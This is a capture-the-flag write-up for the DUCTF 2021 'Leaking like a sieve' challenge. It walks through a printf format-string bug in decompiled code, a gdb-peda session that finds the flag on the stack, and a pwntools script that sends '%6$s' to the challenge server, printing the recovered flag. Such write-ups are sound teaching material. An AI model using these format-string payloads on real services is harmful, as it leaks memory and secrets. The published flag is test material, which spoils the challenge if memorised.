# Leaking like a sieve

## Description

This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add?

Author: xXl33t_h@x0rXx

nc pwn-2021.duc.tf 31918

## Analysis

IDA output:

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+8h] [rbp-58h]
  char format[32]; // [rsp+10h] [rbp-50h] BYREF
  char s[40]; // [rsp+30h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  buffer_init(argc, argv, envp);
  stream = fopen("./flag.txt", "r");
  if ( !stream )
  {
    puts("The flag file isn't loading. Please contact an organiser if you are running this on the shell server.");
    exit(0);
  }
  fgets(s, 32, stream);
  while ( 1 )
  {
    puts("What is your name?");
    fgets(format, 32, stdin);
    printf("\nHello there, ");
    printf(format);
    putchar(10);
  }
}
```

We immediately see a format string vulnerability (`printf(format)`). 
We also know that we can control which argument `printf` prints by providing it with `%?$s`, where `?` is the number.

I created a `flag.txt` file with `DUCTF` as content.

We open it in gdb-peda:
```
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.                                                                                                                                                                 
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from hellothere...
(No debugging symbols found in hellothere)
gdb-peda$ disas main
Dump of assembler code for function main:
   0x00000000000011d8 <+0>:     push   rbp
   0x00000000000011d9 <+1>:     mov    rbp,rsp
   0x00000000000011dc <+4>:     sub    rsp,0x60
   0x00000000000011e0 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x00000000000011e9 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000011ed <+21>:    xor    eax,eax
   0x00000000000011ef <+23>:    lea    rax,[rbp-0x30]
   0x00000000000011f3 <+27>:    mov    QWORD PTR [rbp-0x60],rax
   0x00000000000011f7 <+31>:    mov    eax,0x0
   0x00000000000011fc <+36>:    call   0x1195 <buffer_init>
   0x0000000000001201 <+41>:    lea    rsi,[rip+0xe00]        # 0x2008
   0x0000000000001208 <+48>:    lea    rdi,[rip+0xdfb]        # 0x200a
   0x000000000000120f <+55>:    call   0x1080 <fopen@plt>
   0x0000000000001214 <+60>:    mov    QWORD PTR [rbp-0x58],rax
   0x0000000000001218 <+64>:    cmp    QWORD PTR [rbp-0x58],0x0
   0x000000000000121d <+69>:    jne    0x1235 <main+93>
   0x000000000000121f <+71>:    lea    rdi,[rip+0xdf2]        # 0x2018
   0x0000000000001226 <+78>:    call   0x1040 <puts@plt>
   0x000000000000122b <+83>:    mov    edi,0x0
   0x0000000000001230 <+88>:    call   0x1090 <exit@plt>
   0x0000000000001235 <+93>:    mov    rdx,QWORD PTR [rbp-0x58]
   0x0000000000001239 <+97>:    lea    rax,[rbp-0x30]
   0x000000000000123d <+101>:   mov    esi,0x20
   0x0000000000001242 <+106>:   mov    rdi,rax
   0x0000000000001245 <+109>:   call   0x1070 <fgets@plt>
   0x000000000000124a <+114>:   lea    rdi,[rip+0xe2d]        # 0x207e
   0x0000000000001251 <+121>:   call   0x1040 <puts@plt>
   0x0000000000001256 <+126>:   mov    rdx,QWORD PTR [rip+0x2e13]        # 0x4070 <stdin@GLIBC_2.2.5>
   0x000000000000125d <+133>:   lea    rax,[rbp-0x50]
   0x0000000000001261 <+137>:   mov    esi,0x20
   0x0000000000001266 <+142>:   mov    rdi,rax
   0x0000000000001269 <+145>:   call   0x1070 <fgets@plt>
   0x000000000000126e <+150>:   lea    rdi,[rip+0xe1c]        # 0x2091
   0x0000000000001275 <+157>:   mov    eax,0x0
   0x000000000000127a <+162>:   call   0x1060 <printf@plt>
   0x000000000000127f <+167>:   lea    rax,[rbp-0x50]
   0x0000000000001283 <+171>:   mov    rdi,rax
   0x0000000000001286 <+174>:   mov    eax,0x0
   0x000000000000128b <+179>:   call   0x1060 <printf@plt>
   0x0000000000001290 <+184>:   mov    edi,0xa
   0x0000000000001295 <+189>:   call   0x1030 <putchar@plt>
   0x000000000000129a <+194>:   jmp    0x124a <main+114>
End of assembler dump.
gdb-peda$ break *(main+145)
Breakpoint 1 at 0x1269
gdb-peda$ r
Starting program: /home/kali/Downloads/hellothere 
What is your name?
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdf00 --> 0xf0b5ff 
RBX: 0x0 
RCX: 0x7ffff7eddf33 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7fad980 --> 0xfbad208b 
RSI: 0x20 (' ')
RDI: 0x7fffffffdf00 --> 0xf0b5ff 
RBP: 0x7fffffffdf50 --> 0x5555555552a0 (<__libc_csu_init>:      push   r15)
RSP: 0x7fffffffdef0 --> 0x7fffffffdf20 --> 0xa4654435544 ('DUCTF\n')
RIP: 0x555555555269 (<main+145>:        call   0x555555555070 <fgets@plt>)
R8 : 0x13 
R9 : 0x7ffff7fadbe0 --> 0x55555555a480 --> 0x0 
R10: 0xfffffffffffff287 
R11: 0x246 
R12: 0x5555555550b0 (<_start>:  xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55555555525d <main+133>:   lea    rax,[rbp-0x50]
   0x555555555261 <main+137>:   mov    esi,0x20
   0x555555555266 <main+142>:   mov    rdi,rax
=> 0x555555555269 <main+145>:   call   0x555555555070 <fgets@plt>
   0x55555555526e <main+150>:   lea    rdi,[rip+0xe1c]        # 0x555555556091
   0x555555555275 <main+157>:   mov    eax,0x0
   0x55555555527a <main+162>:   call   0x555555555060 <printf@plt>
   0x55555555527f <main+167>:   lea    rax,[rbp-0x50]
Guessed arguments:
arg[0]: 0x7fffffffdf00 --> 0xf0b5ff 
arg[1]: 0x20 (' ')
arg[2]: 0x7ffff7fad980 --> 0xfbad208b 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdef0 --> 0x7fffffffdf20 --> 0xa4654435544 ('DUCTF\n')
0008| 0x7fffffffdef8 --> 0x5555555592a0 --> 0xfbad2488 
0016| 0x7fffffffdf00 --> 0xf0b5ff 
0024| 0x7fffffffdf08 --> 0xc2 
0032| 0x7fffffffdf10 --> 0x7fffffffdf37 --> 0x5555555550b000 
0040| 0x7fffffffdf18 --> 0x5555555552e5 (<__libc_csu_init+69>:  add    rbx,0x1)
0048| 0x7fffffffdf20 --> 0xa4654435544 ('DUCTF\n')
0056| 0x7fffffffdf28 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555555269 in main ()
gdb-peda$ 
```

We look at the stack and see that we find the `DUCTF` at RSP+48, which means it's the argument with index 6. Let's try it:

```
gdb-peda$ c
Continuing.
%6$s

Hello there, DUCTF
```

Let's try it on the server:

```python
from pwn import *

r = remote("pwn-2021.duc.tf", 31918)
r.recvline()
r.sendline(b"%6$s")
r.recvline()
```

```
[+] Opening connection to pwn-2021.duc.tf on port 31918: Done
[DEBUG] Received 0x13 bytes:
    b'What is your name?\n'
[DEBUG] Sent 0x5 bytes:
    b'%6$s\n'
[DEBUG] Received 0x41 bytes:
    b'\n'
    b'Hello there, DUCTF{f0rm4t_5p3c1f13r_m3dsg!}\n'
    b'\n'
    b'What is your name?\n'
[*] Closed connection to pwn-2021.duc.tf port 31918
```